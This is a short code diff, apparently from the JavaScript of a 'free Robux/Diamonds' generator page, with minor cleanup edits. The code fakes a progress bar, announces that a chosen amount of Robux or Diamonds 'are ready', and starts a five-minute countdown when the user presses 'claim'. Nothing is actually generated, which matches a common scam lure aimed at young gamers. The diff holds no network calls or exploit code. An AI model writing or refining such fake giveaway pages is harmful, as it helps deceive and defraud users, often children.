-        function runProgress(){ /* simplified progress */ showPhase("phase3"); let p=0; const interval = setInterval(()=>{ p+=7; document.getElementById("taskBar").style.width=p+"%"; document.getElementById("taskPercent").innerText=p+"%"; if(p>=100){ clearInterval(interval); setTimeout(()=>{ document.getElementById("readyIcon").innerHTML = `<svg class="icon" viewBox="0 0 128 128"><use href="${state.type==="diamond"?"#diamondIcon":"#coinIcon"}"></use></svg>`; document.getElementById("prizeShow").innerText = `${state.amount.toLocaleString()} ${state.type==="diamond"?"Diamonds are":"Robux are"} ready!`; showPhase("phase4"); },500); } }, 65); }
+        function runProgress(){ showPhase("phase3"); let p=0; const interval = setInterval(()=>{ p+=7; document.getElementById("taskBar").style.width=p+"%"; document.getElementById("taskPercent").innerText=p+"%"; if(p>=100){ clearInterval(interval); setTimeout(()=>{ document.getElementById("readyIcon").innerHTML = `<svg class="icon" viewBox="0 0 128 128"><use href="${state.type==="diamond"?"#diamondIcon":"#coinIcon"}"></use></svg>`; document.getElementById("prizeShow").innerText = `${state.amount.toLocaleString()} ${state.type==="diamond"?"Diamonds are":"Robux are"} ready!`; showPhase("phase4"); },500); } }, 65); }
         document.getElementById("claimBtn").onclick = () => { document.getElementById("checkSection").classList.add("hidden"); document.getElementById("doneSection").classList.remove("hidden"); let t=300, intv=setInterval(()=>{ if(t<=0)clearInterval(intv); let m=Math.floor(t/60), s=t%60; document.getElementById("timer").innerText=`${m.toString().padStart(2,"0")}:${s.toString().padStart(2,"0")}`; t--; },1000); };
       }
       document.body.classList.remove('landing-active');
       window.scrollTo({ top: 0 });
     }
 
-    // Landing buttons
     document.querySelectorAll('.landing-btn').forEach(btn => {
-      btn.addEventListener('click', (e) => {
+      btn.addEventListener('click', () => {
         const entry = btn.dataset.entry;
         showLandingToast(entry === 'rbx' ? 'Loading RBX...' : (entry === 'brainrot' ? 'Stealing a Brainrot...' : 'Escaping Tsunami...'));
         setTimeout(() => {
